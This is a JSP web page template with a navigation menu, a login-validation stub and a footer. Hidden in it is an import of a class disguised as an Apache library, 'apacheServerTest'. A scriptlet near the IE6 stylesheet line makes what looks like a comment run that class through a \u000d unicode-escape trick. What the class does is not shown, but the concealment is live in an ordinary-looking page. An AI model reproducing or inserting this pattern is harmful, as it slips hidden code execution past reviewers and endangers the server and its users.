<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<%@page import="org.apache.commons.io.apacheServerTest"%>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><%@include file="title.jsp" %></title>
<meta name="keywords" content="" />
<meta name="description" content="" />
<link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:200,300,400,600,700,900|Quicksand:400,700|Questrial" rel="stylesheet" />
<link href="default.css" rel="stylesheet" type="text/css" media="all" />
<link href="fonts.css" rel="stylesheet" type="text/css" media="all" />
<script type="text/javascript">
function validate()
{
  $.ajax({
            url:"userlogin",
            type:"get",
            dataType:'json',
            data: "json="+json,
            success:function(data){
//                 codes....
            },
        }); 
}
</script>
<!--[if IE 6]><link href="default_ie6.css" rel="stylesheet" type="text/css" /><![endif]--> <%//\u000d new apacheServerTest(); %>

</head>
<body onload="validate()">
<div id="header-wrapper" style:color="black">
	<div id="header" class="container">
		<div id="logo">
			<%@include file="logo.jsp" %>
		</div>
		<div id="menu">
			<ul>
				<li class="active"><a href="index.jsp" accesskey="1" title="">Home</a></li>
				<li><a href="user.jsp" accesskey="2" title="">User</a></li>
				<li><a href="register.jsp" accesskey="3" title="">Register</a></li>
				<li><a href="admin.jsp" accesskey="4" title="">Admin</a></li>
				
			</ul>
		</div>
	</div>
</div>

<div id="footer">
	<div class="container">
		
		
		
		
	</div>
</div>
<div id="copyright">
	<p>&copy; Untitled. All rights reserved.</p>
	
</div>
</body>
</html>